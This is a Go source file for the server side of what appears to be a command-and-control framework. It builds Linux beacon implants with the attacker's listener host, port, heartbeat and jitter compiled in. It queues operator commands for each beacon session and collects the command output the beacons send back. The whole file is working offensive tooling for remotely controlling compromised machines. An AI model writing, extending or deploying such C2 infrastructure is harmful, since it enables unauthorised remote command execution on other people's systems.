package server

import (
	"os/exec"
	"fmt"
	"net/http"
	"strconv"
	"encoding/json"
)

func CreateBeacon(lhost string, lport string, heartbeat string, jitter string, outputDir string) {
	linkerString := fmt.Sprintf("-X 'main.lhost=%s' -X 'main.lport=%s' -X 'main.heartbeat=%s' -X 'main.jitter=%s'", lhost, lport, heartbeat, jitter)

	cmd := exec.Command("go", "build", "-ldflags", linkerString, "-o", outputDir, "./cmd/client/linux/beacons/main.go")
	err := cmd.Run();

	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Printf("Built beacon to %s\n", outputDir)
	}
}

func (l *Listener) GetCommands(w http.ResponseWriter, r *http.Request) {
	sid := r.PathValue("id") + ":" + strconv.Itoa(l.id)
	session, ok := l.activeSessions[sid]
	if !ok {
		w.WriteHeader(404)
		return
	}

	w.Header().Set("Content-Type", "text/plain")
	w.WriteHeader(http.StatusOK)

	for len(session.commQueue) > 0 {
		command := session.commQueue[0]
		session.commQueue = session.commQueue[1:]
		fmt.Fprintf(w, "data: %s\n\n", command.input)
	}
}

func (l *Listener) BeaconResponse(w http.ResponseWriter, r *http.Request) {
	sid := r.PathValue("id") + ":" + strconv.Itoa(l.id)
	if sid == "" {
		fmt.Println("Malformed Request")
		return
	}
	session, ok := l.activeSessions[sid]
	if !ok {
		fmt.Println("Session does not exist")
		return
	}

	type CommandResult struct {
		Input  string `json:"input"`
		Output string `json:"output"`
	}
	type Batch struct {
		Results []CommandResult `json:"results"`
	}

	var batch Batch

	if err := json.NewDecoder(r.Body).Decode(&batch); err != nil {
		http.Error(w, "bad json", http.StatusBadRequest)
		return
	}
	
	for _, res := range batch.Results {
		c := Command{input: res.Input, output: res.Output}
		session.commResponseQueue = append(session.commResponseQueue, c)
	}
	w.WriteHeader(http.StatusOK)
}